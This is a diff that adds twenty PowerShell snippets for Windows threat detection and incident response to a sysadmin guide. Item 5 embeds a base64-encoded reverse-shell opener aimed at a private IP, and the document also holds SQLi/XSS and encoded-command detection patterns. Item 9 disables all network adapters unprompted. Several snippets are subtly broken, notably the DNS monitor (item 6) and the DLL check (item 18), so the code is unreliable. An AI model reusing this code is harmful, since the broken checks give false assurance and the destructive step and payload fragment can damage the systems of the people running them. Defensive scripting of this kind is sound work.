@@ -1185,3 +1185,238 @@ Write-Host "System audit report generated at C:\SysAudits\$(Get-Date -Format yyy
     Select BatteryStatus, EstimatedChargeRemaining, EstimatedRunTime
     ```
     
+
+### **1. Detect Suspicious Processes**  
+*Identify unsigned or hidden processes:*  
+```powershell
+Get-Process | Where-Object { 
+  $_.Path -and (-not (Get-AuthenticodeSignature -FilePath $_.Path).IsOSBinary) 
+} | Format-Table Name, Path, Id -AutoSize
+# Highlight processes not signed by Microsoft
+Write-Host "Unsigned processes:" -ForegroundColor Red
+```
+
+---
+
+### **2. Network Anomaly Detection**  
+*Alert on unexpected open ports:*  
+```powershell
+$baselinePorts = @(80, 443, 22) # Whitelist
+Get-NetTCPConnection | Where-Object { 
+  $_.State -eq 'Listen' -and $_.LocalPort -notin $baselinePorts 
+} | Select LocalAddress, LocalPort
+```
+
+---
+
+### **3. File Integrity Monitor (FIM)**  
+*Track unauthorized file changes with hashing:*  
+```powershell
+$criticalFiles = "C:\Windows\System32\*.dll"
+$baseline = Get-ChildItem $criticalFiles | Get-FileHash -Algorithm SHA256
+# Compare later:
+Compare-Object -ReferenceObject $baseline -DifferenceObject (Get-ChildItem $criticalFiles | Get-FileHash) -Property Hash
+```
+
+---
+
+### **4. YARA Rule Malware Scanner**  
+*Scan files using YARA rules (requires YARA installed):*  
+```powershell
+$yaraPath = "C:\Tools\yara64.exe"
+$rulePath = "C:\Rules\malware_rules.yar"
+Get-ChildItem -Path "C:\Downloads" -Recurse | ForEach-Object {
+  & $yaraPath -r $rulePath $_.FullName
+}
+```
+
+---
+
+### **5. Decode Obfuscated Commands**  
+*Unpack base64-encoded PowerShell attacks:*  
+```powershell
+$suspiciousString = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMAKQA7AA=="
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($suspiciousString))
+```
+
+---
+
+### **6. DNS Query Monitor**  
+*Detect suspicious domain lookups:*  
+```powershell
+$maliciousDomains = @("evil.com", "phishing.net") | Get-DnsClientCache | 
+  Where-Object { $_.Entry -in $maliciousDomains } | 
+  Select Name, Data
+```
+
+---
+
+### **7. Log Analysis for Brute Force Attacks**  
+*Parse security logs for failed login spikes:*  
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName='Security'
+  ID=4625 # Failed logon
+} | Group-Object -Property {$_.Properties[19].Value} | 
+  Where-Object { $_.Count -gt 5 } | Select Name, Count
+```
+
+---
+
+### **8. SSL/TLS Vulnerability Check**  
+*Test for weak protocols/ciphers:*  
+```powershell
+$url = "https://example.com"
+$protocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
+[System.Net.ServicePointManager]::SecurityProtocol = $protocols
+try { Invoke-WebRequest -Uri $url } catch { $_.Exception.Message }
+```
+
+---
+
+### **9. Automated Incident Response**  
+*Isolate compromised host (quarantine):*  
+```powershell
+# Disable network interfaces
+Get-NetAdapter | Disable-NetAdapter -Confirm:$false
+# Dump process memory
+Get-Process | Where-Object { $_.CPU -gt 90 } | ForEach-Object {
+  ProcDump.exe -ma $_.Id
+}
+```
+
+---
+
+### **10. Honeypot File Monitor**  
+*Track access to decoy files:*  
+```powershell
+$honeypot = "C:\Fake_Data\passwords.txt"
+$watcher = New-Object System.IO.FileSystemWatcher
+$watcher.Path = (Split-Path $honeypot)
+Register-ObjectEvent $watcher "Changed" -Action {
+  if ($Event.SourceEventArgs.Name -eq (Split-Path $honeypot -Leaf)) {
+    Write-Host "Honeypot accessed by: $(Get-Process -Id $Event.SourceEventArgs.ProcessId)"
+  }
+}
+```
+
+---
+
+### **11. Password Spray Attack Detection**  
+*Identify account lockout patterns:*  
+```powershell
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4625]]" | 
+  Group-Object -Property {$_.Properties[5].Value} | 
+  Where-Object { $_.Count -gt 3 }
+```
+
+---
+
+### **12. Memory Dump Analysis**  
+*Check for signs of code injection:*  
+```powershell
+Get-WinEvent -LogName "Application" | 
+  Where-Object { $_.Message -like "*CreateRemoteThread*" } | 
+  Select TimeCreated, Message
+```
+
+---
+
+### **13. Suspicious PowerShell Logging**  
+*Analyze ScriptBlock logs for encoded commands:*  
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 100 | 
+  Where-Object { $_.Message -match "FromBase64String|Invoke-Expression" }
+```
+
+---
+
+### **14. Firewall Rule Audit**  
+*Verify allowed inbound rules:*  
+```powershell
+Get-NetFirewallRule -Direction Inbound | 
+  Where-Object { $_.Enabled -eq 'True' } | 
+  Select DisplayName, Profile
+```
+
+---
+
+### **15. GitHub API Automation**  
+*Automate repository checks via REST API:*  
+```powershell
+$token = "ghp_yourtokenhere"
+$headers = @{ Authorization = "Bearer $token" }
+Invoke-RestMethod -Uri "https://api.github.com/user/repos" -Headers $headers | 
+  Select name, html_url, pushed_at
+```
+
+---
+
+### **16. Code Syntax Checker**  
+*Lint PowerShell scripts with PSScriptAnalyzer:*  
+```powershell
+Install-Module -Name PSScriptAnalyzer -Force
+Invoke-ScriptAnalyzer -Path "C:\Scripts\malicious.ps1" -Severity Error,Warning
+```
+
+---
+
+### **17. Automated Code Generation**  
+*Create boilerplate templates:*  
+```powershell
+function New-FunctionTemplate {
+  param([string]$Name)
+  @"
+function $Name {
+  [CmdletBinding()]
+  param(
+    [Parameter(Mandatory)]
+    [string]`$Input
+  )
+  # Logic here
+}
+"@ | Out-File ".\$Name.ps1"
+}
+```
+
+---
+
+### **18. DLL Injection Detector**  
+*Find processes with unsigned DLLs:*  
+```powershell
+Get-Process | ForEach-Object {
+  $_.Modules | Where-Object { 
+    $_.FileName -notmatch "C:\\Windows\\" -and 
+    (-not (Get-AuthenticodeSignature -FilePath $_.FileName).Status -eq "Valid"
+  }
+}
+```
+
+---
+
+### **19. HTTP Request Analyzer**  
+*Detect SQLi/XSS in web logs:*  
+```powershell
+Select-String -Path "C:\Logs\access.log" -Pattern "('|--|;)|(<script>|alert\(|onerror=)" -AllMatches
+```
+
+---
+
+### **20. Block TOR Exit Nodes**  
+*Automatically block TOR IPs:*  
+```powershell
+$torIPs = (Invoke-RestMethod "https://check.torproject.org/exit-addresses").split("`n") | 
+  Where-Object { $_ -match "^ExitAddress" } | 
+  ForEach-Object { $_.split()[1] }
+$torIPs | ForEach-Object { New-NetFirewallRule -DisplayName "Block TOR $_" -RemoteAddress $_ -Action Block }
+```
+
+---
+
+### **Usage Notes**  
+- Many scripts require **elevated privileges** (Run as Admin).  
+- Tools like YARA or ProcDump need to be pre-installed.  
+- Test in a safe environment before deployment.  
+- Adjust paths, IPs, and thresholds based on your environment.  
+
+
